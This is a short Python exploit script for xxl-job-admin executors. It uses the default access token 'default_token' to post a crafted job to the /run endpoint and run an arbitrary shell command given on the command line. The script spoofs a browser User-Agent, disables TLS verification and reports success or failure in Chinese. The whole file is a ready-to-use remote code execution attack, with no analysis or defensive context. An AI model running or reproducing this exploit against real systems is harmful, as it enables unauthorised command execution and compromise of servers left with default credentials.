import argparse
import json

import requests


def main():
    parser = argparse.ArgumentParser(description='xxl-job-admin default_token to rce.')
    parser.add_argument('-u', '--url', type=str, help='Target url.')
    parser.add_argument('-c', '--cmd', type=str, help='Set command.')
    parser.add_argument('-t', '--token', type=str, default='default_token', help='Set default access token.')
    args = parser.parse_args()

    exploit(args.url, args.cmd, args.token)


def exploit(url, command, token):
    headers = {
        "xxl-job-access-token": token,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
    }
    data = '{"jobId":1,"executorHandler":"commandJobHandler","executorParams":"' + command + '","executorBlockStrategy":"","executorTimeout":0,"logId":1,"logDateTime":1586629003733,"glueType":"BEAN","glueSource":1,"glueUpdatetime":1586629003727,"broadcastIndex":0,"broadcastTotal":0}'
    response = requests.post(url + "/run", data=data, verify=False,
                             timeout=5, headers=headers)
    resp = json.loads(response.text)
    if (resp['code'] == 200):
        print("[+] 执行成功!")
    else:
        print("[!] 执行失败!")


if __name__ == '__main__':
    main()
